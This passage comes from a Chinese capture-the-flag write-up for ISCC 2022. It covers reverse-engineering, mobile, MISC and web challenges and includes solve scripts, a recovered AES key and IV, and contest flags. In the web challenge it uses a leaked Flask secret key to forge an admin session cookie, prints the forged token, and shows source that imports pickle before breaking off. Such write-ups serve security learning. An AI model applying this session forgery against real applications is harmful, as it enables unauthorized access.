class=\"token number\">73</span><span class=\"token punctuation\">,</span><span class=\"token number\">71</span><span class=\"token punctuation\">,</span><span class=\"token number\">74</span><span class=\"token punctuation\">]</span>\ncode <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nflag <span class=\"token operator\">=</span><span class=\"token string\">''</span>\nstr_len <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>str_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    code<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>str2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>str_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> i<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n\n<span class=\"token operator\">//</span><span class=\"token punctuation\">[</span><span class=\"token number\">73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">127</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">113</span><span class=\"token punctuation\">,</span> <span class=\"token number\">109</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">121</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">]</span>\n</code></pre>\n<p>ISCC{reverse_i18Li8}</p>\n<h1><a id=\"MOBILE_880\"></a>MOBILE</h1>\n<h3><a id=\"MOBILEA_882\"></a>MOBILEA</h3>\n<p>全局搜索关键字iscc</p>\n<p>首先来看下Jlast函数</p>\n<pre><code class=\"prism language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">boolean</span> <span class=\"token class-name\">Jlast</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> str<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token class-name\">MessageDigest</span> instance <span class=\"token operator\">=</span> <span class=\"token class-name\">MessageDigest</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"MD5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">encode<span class=\"token punctuation\">.</span></span>BASE64Encoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">String</span> encode <span class=\"token operator\">=</span> <span class=\"token class-name\"><span class=\"token namespace\">encode<span class=\"token punctuation\">.</span></span>BASE64Encoder</span><span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">.</span><span class=\"token function\">digest</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>encode<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cArr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span>encode<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">boolean</span> z <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i2 <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> i2 <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i2<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>z<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i3 <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> i3 <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i3<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                        cArr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> encode<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i3 <span class=\"token operator\">*</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> i2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token punctuation\">}</span>\n                    z <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n                    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i4 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> i4<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                        cArr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> encode<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i4 <span class=\"token operator\">*</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> i2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token punctuation\">}</span>\n                    z <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span>cArr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"=IkMBb+=gF2/Try5PCUruw1j\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n</code></pre>\n<p>将内容逆回去</p>\n<pre><code class=\"prism language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">mobile</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> k <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n\n        <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cArr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> a <span class=\"token operator\">=</span> <span class=\"token string\">\"=IkMBb+=gF2/Try5PCUruw1j\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">boolean</span> z <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i2 <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> i2 <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i2<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>z<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i3 <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> i3 <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i3<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                    cArr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>i3 <span class=\"token operator\">*</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> i2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n                z <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i4 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> i4<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                    cArr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>i4 <span class=\"token operator\">*</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> i2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n                z <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>cArr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-tKJD6yg2-1654502690058)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e965896d-2d5d-47b9-9f34-64de50b198b8/Untitled.png)]\" src=\"image\\bae35cdc5fdb4833b5f2d8c0ab3b15c7.png\"/></p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-gsdmEzZo-1654502690059)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8a964126-d161-4167-aa99-0ea3e11f1682/Untitled.png)]\" src=\"image\\7d70d062a681457782f591fc09813421.png\"/></p>\n<p>MD5解密</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-vCJtoMxa-1654502690060)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/71ad8a2f-22b7-41ee-af7d-63b9a7f50bae/Untitled.png)]\" src=\"image\\ffa19aed6b834893b69f940145ac5683.png\"/></p>\n<p>得到_到}的内容</p>\n<p>再来看AES的部分</p>\n<pre><code class=\"prism language-java\">\n                <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{<!-- --></span>\n                    <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"K@e2022%%y\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardCharsets</span><span class=\"token punctuation\">.</span>UTF_8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardCharsets</span><span class=\"token punctuation\">.</span>UTF_8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I&amp;V2022***\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardCharsets</span><span class=\"token punctuation\">.</span>UTF_8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardCharsets</span><span class=\"token punctuation\">.</span>UTF_8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes3 <span class=\"token operator\">=</span> str<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardCharsets</span><span class=\"token punctuation\">.</span>UTF_8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token class-name\">SecretKeySpec</span> secretKeySpec <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SecretKeySpec</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">,</span> <span class=\"token string\">\"AES\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token class-name\">IvParameterSpec</span> ivParameterSpec <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IvParameterSpec</span><span class=\"token punctuation\">(</span>bytes2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token class-name\">Cipher</span> instance <span class=\"token operator\">=</span> <span class=\"token class-name\">Cipher</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"AES/CBC/PKCS7Padding\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    instance<span class=\"token punctuation\">.</span><span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> secretKeySpec<span class=\"token punctuation\">,</span> ivParameterSpec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">encodeToString</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">.</span><span class=\"token function\">doFinal</span><span class=\"token punctuation\">(</span>bytes3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardCharsets</span><span class=\"token punctuation\">.</span>UTF_8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ZHNGazZsRGM1MXZ4VnQ1bUdadEptNDJaUkVqY2lyOFlQcEhEUGs5cDJxWT0=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token punctuation\">}</span>\n                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                    e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n</code></pre>\n<p>这里可以得到秘钥和偏移量</p>\n<p>将内容（ZHNGazZsRGM1MXZ4VnQ1bUdadEptNDJaUkVqY2lyOFlQcEhEUGs5cDJxWT0=）base64解密后</p>\n<p>拿去解密即可得到{后到_的内容</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-d0Q9b8GE-1654502690061)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d95173b3-1bad-4f76-93d9-a85e5051f632/Untitled.png)]\" src=\"image\\0144ff98ef714272971371f8c23ae819.png\"/></p>\n<p>和leaf组合起来就是</p>\n<p>ISCC{JFV(*&amp;TFVcfgtyui_leaf}</p>\n<h1><a id=\"_1000\"></a>擂台</h1>\n<h2><a id=\"MISC_1002\"></a>MISC</h2>\n<h3><a id=\"666_1004\"></a>666</h3>\n<p>08→00</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jrZQsIFT-1654502690061)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0e9bb2d5-9949-48b3-8b44-0e28b3d99b34/Untitled.png)]\" src=\"image\\debe0ae2387b43c0bea9fd68a8c6f6d0.png\"/></p>\n<p>得到图片</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-6UQTF8uH-1654502690062)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5384bd46-393a-4a62-bab7-665b6420e1a4/Untitled.png)]\" src=\"image\\4b4f5065447d466f8c57288359598d92.png\"/></p>\n<p>新的图片修改高度</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-CsGK8ZIQ-1654502690063)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3d81b698-a3a4-49bf-b5fa-d9393e6d698c/Untitled.png)]\" src=\"image\\0595e85c3ffa41019600102fe0e4617c.png\"/></p>\n<p>得到密码 !@#$%678()_+</p>\n<p>流量分析</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-y2b1Yo8e-1654502690063)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/62f662d7-b289-490c-bed9-cff59a2d8d54/Untitled.png)]\" src=\"image\\3da2b6401a874c2ea219647cd9fcb2b6.png\"/></p>\n<p><a href=\"https://www.cnblogs.com/konglingdi/p/14998301.html\">https://www.cnblogs.com/konglingdi/p/14998301.html</a></p>\n<p>得到gif图片</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-dStASa8x-1654502690064)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dbaeb230-19ee-4327-b377-7c2fa791dae5/Untitled.png)]\" src=\"image\\087f38040f174df1a9e7b4e5f2811acd.png\"/></p>\n<p>第六帧出现</p>\n<p>SE1ERWt1eTo4NTIgOTg3NDU2MzIxIDk4NDIzIDk4NDIzIFJFQUxrZXk6eFN4eA==</p>\n<p>第十六帧出现</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-YpbycIO5-1654502690064)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/61d03c8f-bf21-4f1a-80b4-549906ee2a85/Untitled.png)]\" src=\"image\\5e8f660e68074212bcf32c6c40a0daad.png\"/></p>\n<p>pQLKpP/</p>\n<p>第二十六帧出现</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-O9FcUglm-1654502690066)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3b64617a-06d1-40b3-ab0f-c7717b017801/Untitled.png)]\" src=\"image\\6fcbaa045a08428b96509f2a545e4168.png\"/></p>\n<p>EPmw301eZRzuYvQ==</p>\n<p>九键密码</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-68ZSCvUC-1654502690066)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2c4d2b53-514a-4fc1-9ad9-b5465b74d008/Untitled.png)]\" src=\"image\\91aac72c0f424e0e85697f4eade87e01.png\"/></p>\n<p>aes解密得到flag</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-sZtr1Rnl-1654502690067)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/da5be82d-3a69-4f0b-9548-0b20f38fb1fa/Untitled.png)]\" src=\"image\\a9890ecfa0984d8fa53bb7342d301f5f.png\"/></p>\n<p>ISCC{lbwmeiyoukaig}</p>\n<h2><a id=\"WEB_1065\"></a>WEB</h2>\n<h3><a id=\"Melody_1067\"></a>Melody</h3>\n<p><s>本人信息收集能力很弱</s>能得到的信息很少</p>\n<p><img alt=\"https://cdn.nlark.com/yuque/0/2022/png/12546170/1651588491332-947812e6-c2f8-42d4-be3b-0ba74fbae3d8.png\" src=\"image\\33293316526d5f42f58b485998db78b3.png\"/></p>\n<p>提示使用Melody浏览器</p>\n<p><img alt=\"https://cdn.nlark.com/yuque/0/2022/png/12546170/1651588668492-76d17fd1-081a-43e3-b433-bee36cfca7b0.png\" src=\"image\\439c184050dc0ea145b18df1d891c272.png\"/></p>\n<p>给了参数</p>\n<p><img alt=\"https://cdn.nlark.com/yuque/0/2022/png/12546170/1651588713299-5dd057c4-9e72-4b47-a1d2-de5fbc315d0d.png\" src=\"image\\8bd5d1264e115b21044a75185129bce0.png\"/></p>\n<p>看下配置文件(框架是flask的</p>\n<p><img alt=\"https://cdn.nlark.com/yuque/0/2022/png/12546170/1651589056531-3d83009e-4da4-4272-b11f-31011a435339.png\" src=\"image\\0c232947c528e37709a2db54605092aa.png\"/></p>\n<p>查找关键字秘钥</p>\n<p><img alt=\"https://cdn.nlark.com/yuque/0/2022/png/12546170/1651589143648-2a867f3e-5262-41c7-bd46-d5d4fec7e700.png\" src=\"image\\7fa271bd9dbb1a54b4bca0b1e9254a8c.png\"/></p>\n<p>秘钥：</p>\n<p>meldoy-is-so-cute-wawawa!</p>\n<p>伪造一下</p>\n<p><img alt=\"https://cdn.nlark.com/yuque/0/2022/png/12546170/1651630592042-45ecd223-5625-4119-8e0d-e2599a532e4c.png\" src=\"image\\dfc88d818ac303da1f40ac46dd5947cd.png\"/></p>\n<pre><code class=\"prism language-python\">eyJ1c2VybmFtZSI6ImFkbWluIn0<span class=\"token punctuation\">.</span>YnHhUw<span class=\"token punctuation\">.</span>Doua6BXcMvBlLiF30ytOcDVBqZQ\n</code></pre>\n<p>登录</p>\n<p><img alt=\"https://cdn.nlark.com/yuque/0/2022/png/12546170/1651630579404-a85cca15-402c-444d-b877-d63b1e051abe.png\" src=\"image\\ea8405d2a93df96a42a7f7e46ac7ee20.png\"/></p>\n<p>没有flag</p>\n<p>F12</p>\n<p>源码如下：</p>\n<pre><code class=\"prism language-python\"><span class=\"token comment\"># -*- coding:utf-8 -*-</span>\n<span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> melody\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> Response<span class=\"token punctuation\">,</span>request\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">register</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name\n        self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> password\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__eq__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> other<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span 